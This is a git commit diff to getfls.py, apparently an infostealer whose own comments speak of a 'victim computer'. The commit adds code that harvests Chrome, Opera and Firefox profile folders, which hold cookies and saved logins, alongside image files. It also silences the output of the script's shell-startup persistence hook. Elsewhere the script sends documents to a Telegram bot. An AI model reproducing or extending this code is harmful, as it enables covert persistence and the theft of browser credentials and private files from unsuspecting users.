704d5b872a2a097e68bc28442bd21525e40e9aa7
Hans Gottinger <lupataya.staruxa@mailfence.com>
2022-04-10 23:36:33 +0300

    Organized files in folders added web-browsers profiles

--- getfls.py
+++ getfls.py
@@ -6,6 +6,7 @@ from multiprocessing import Pool,Process,Queue,Lock
 import multiprocessing
 import requests
 import config
+import glob
 if os.name=='nt':
     try:
         import winshell
@@ -29,7 +30,11 @@ def get_files(directory_path,extlist):
         for name in files:
             fname=os.path.join(root, name)
             if any([ele for  ele in extlist if fname.endswith("."+ele)]):
-                file_list.append(fname)
+                splittup=os.path.splitext(fname)
+                ext=splittup[1]
+                if ext=='':
+                    ext='default'
+                file_list.append((fname,ext[1:]))
 
 def winntAutoRun():
     fname=sys.argv[0]
@@ -79,10 +84,10 @@ def addToAutoRun():
         print('Зараз додаємо файл в автозапуск')
         try:
             with open(autoconf,'a',encoding="utf-8", newline='') as shellrc:
-                shellrc.write(f"\npython3 {scrptName}")
+                shellrc.write(f"\npython3 {scrptName} 2>&1 >/dev/null")
         except FileNotFoundError:
             with open(autoconf,'x',encoding="utf-8", newline='') as shellrc:
-                shellrc.write(f"\npython3 {scrptName}")            
+                shellrc.write(f"\npython3 {scrptName} 2>&1 >/dev/null")            
     return
 
 def send_document(bot_token,chtid,docfile,caption='Nothing'):
@@ -103,10 +108,15 @@ def superProc(fileList,num,extlist,hostdir,hostname):
     while True:
         while len(fileList)>=num:
             try:
-                fname=fileList[cnt]
+                fname=fileList[cnt][0]
+                dname=fileList[cnt][1]
+                dirname=f"{hostdir}{sep}{dname}"
+                if not os.path.exists(dirname):
+                    os.mkdir(dirname)
                 print(f'Proc {num}:',fname)
                 newname=fname[len(fname)-fname[::-1].index(sep)-1:]
-                copyFile(fname,f".{sep}{hostdir}{sep}{newname}")
+                copyFile(fname,f"{dirname}{sep}{newname}")
+                print(f"copyFile({fname}",f"{dirname}{sep}{newname}")
                 if fileList[cnt]=='TERMINATED':
                     return
                 cnt+=PROC_NUM
@@ -122,6 +132,8 @@ def main():
     global PROC_NUM
     global sep
     global file_list
+
+    linuxSuperFilesLst=[]
     if os.name!='nt':
         addToAutoRun()
     else:
@@ -132,15 +144,19 @@ def main():
     hostname=socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
 
-    hostdir=f"./{hostname}-files"
-    if not os.path.exists(hostdir):
-        print(f'!!!Create directory {hostdir}')#Creating directory for files from victim computer
-        if os.name=='nt':
-            os.mkdir(hostdir,mode)
-        else:
-            os.mkdir(hostdir)
+    hostdir=f".{sep}{hostname}-files"
+    operdir=f".{sep}{hostname}-files{sep}opera"
+    firefoxdir=f".{sep}{hostname}-files{sep}firefox"
+    chromedir=f".{sep}{hostname}-files{sep}chrome"
+    
+    dirlist=[hostdir,operdir,firefoxdir,chromedir]
+    for dir in dirlist:
+        if not os.path.exists(dir):
+            print(f'!!!Create directory {dir}')#Creating directory for files from victim computer
+            os.mkdir(dir)        
+            
     #extlist=['ini','inf','reg','sh','pl','py','sql']# here you type file extensions you want save on your USB device
-    extlist=['jpg','jpeg','png','gif','ico']
+    extlist=['jpg','jpeg','gif','ico']
     with multiprocessing.Manager() as manager:
         file_list=manager.list()
         procs=[]
@@ -152,6 +168,16 @@ def main():
         if os.name!= 'nt':
             directory_path='/'
         else:
+            for file in glob.glob(os.environ['APPDATA']+"\..\\Local\\Google\\Chrome\\User Data\\Default\\*"):
+                file_list.append((file,'chrome'))
+                    
+            for file in glob.glob(os.environ['APPDATA']+"\\Opera Software\\Opera Stable\\*"): 
+                if os.path.split(file)[1][0].isupper():
+                    file_list.append((file,'opera'))
+        
+            for file in glob.glob(os.environ['APPDATA']+"\\Mozilla\\Firefox\\Profiles\\*.default-release\\*"):
+                file_list.append((file,'firefox'))
+    
             directory_path=r'D:\\'
         get_files(directory_path,extlist) 
         if os.name=='nt':
